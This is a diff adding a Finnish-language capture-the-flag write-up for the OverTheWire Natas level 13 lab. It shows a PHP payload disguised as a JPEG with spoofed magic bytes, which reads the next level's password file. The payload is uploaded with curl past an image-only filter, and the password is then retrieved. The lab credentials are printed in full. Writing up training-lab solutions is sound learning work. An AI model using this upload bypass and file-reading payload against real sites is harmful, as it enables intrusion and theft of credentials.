@@ -403,7 +403,69 @@ Ja missä se Natas 14 salasanansa onkaan? Se on toi tummennettu osa, ja kantsii 
 
 ![alt text](./kuvat-level11-15/natas13-17.png)
 
+## Level 13 - 3 - Kali Linux - START HERE;
 
+loin satunnaisen tiedoston nimen, mutta mentiin ohjeen mukaan kuitenkin
+
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ echo -e "\xFF\xD8\xFF\xE0" > image1.php
+
+┌──(kali㉿kali)-[~/Desktop]
+└─$ file image1.php  
+image1.php: JPEG image data
+
+
+append the PHP code
+┌──(kali㉿kali)-[~/Desktop]
+└─$ echo -n '<?php $p = file_get_contents("/etc/natas_webpass/natas14"); echo $p; ?>' >> image1.php 
+
+┌──(kali㉿kali)-[~/Desktop]
+└─$ file image1.php 
+image1.php: JPEG image data
+
+┌──(kali㉿kali)-[~/Desktop]
+└─$ cat image1.php                                                                                                  
+����
+<?php $p = file_get_contents("/etc/natas_webpass/natas14"); echo $p; ?>                                                                                                                         
+```
+
+Pysytään yhä Kali linux desktopissa ja suoritettaan tämä prosessi viimeisenä, ja huomioina tiedoston nimi pitää olla tasalleen tarkka.
+
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ curl -u natas13:trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC -F "MAX_FILE_SIZE=1000" -F "filename=image1.php" -F "uploadedfile=@./image1.php" http://natas13.natas.labs.overthewire.org
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas13", "pass": "trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC" };</script></head>
+<body>
+<h1>natas13</h1>
+<div id="content">
+For security reasons, we now only accept image files!<br/><br/>
+
+The file <a href="upload/7801d4li7v.php">upload/7801d4li7v.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+ainakin saattiin toi viimeinen tiedoston polku ja mikä data **/upload/7801d4li7v.php**
+
+Sitten tarkistettaan sen sisältö ja normi `curl` komento, ja saattiin Natas 14 salasansa.
+
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ curl -u natas13:trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC http://natas13.natas.labs.overthewire.org/upload/7801d4li7v.php
+����
+z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
+```
 
 
 
